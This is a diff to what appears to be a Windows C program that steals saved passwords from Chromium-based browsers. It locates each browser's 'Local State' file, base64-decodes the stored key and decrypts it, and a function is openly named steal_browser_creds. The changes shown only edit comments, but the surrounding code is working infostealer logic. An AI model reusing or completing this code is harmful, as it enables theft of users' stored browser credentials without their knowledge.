@@ -74,7 +74,9 @@ BrowserInfo browsers[] = {
      L"\\Vivaldi\\User Data\\Local State"},
 };
 
-// NOTE: `encryptedKeyOut` must be freed by the caller
+// Retreive an encoded (base64) and encrypted (AES-GCM) from the JSON file at
+// `localStatePath`
+// NOTE: `encodedKeyOut` must be freed by the caller
 static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
   HANDLE fileHandle =
       CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
@@ -147,9 +149,9 @@ static int retrieve_encoded_key(PWSTR localStatePath, PSTR *encodedKeyOut) {
   return EXIT_SUCCESS;
 }
 
-// Decodes a base64 `encodedKey` into `decodedKeyOut`, note that decodedKeyOut
-// is still encrypted at this point NOTE: `decodedKeyOut` must be freed by the
-// caller
+// Decodes a base64 `encodedKey` (also cleans the key) into `decodedKeyOut`,
+// note that `decodedKeyOut` is still encrypted at this point
+// NOTE: `decodedKeyOut` must be freed by the caller
 static int decode_key(PSTR encodedKey, BYTE *decodedKeyOut[],
                       size_t *decodedKeySizeOut) {
   // Get size of the decoded key (needed for the next malloc)
@@ -215,10 +217,12 @@ static int decrypt_key(BYTE encryptedKey[], size_t encryptedKeySize,
   decryptedKeyOut->pbData = DataOutput.pbData;
 
   // we could free encryptedKey here but I rather leave it to the original
-  // caller free(encryptedKey);
+  // caller
+  // free(encryptedKey);
   return EXIT_SUCCESS;
 }
 
+// Steals credentials for a singular `browser`
 static int steal_browser_creds(BrowserInfo browser) {
   // login data contains each logins with the password encrypted and other
   // attributes in clear text
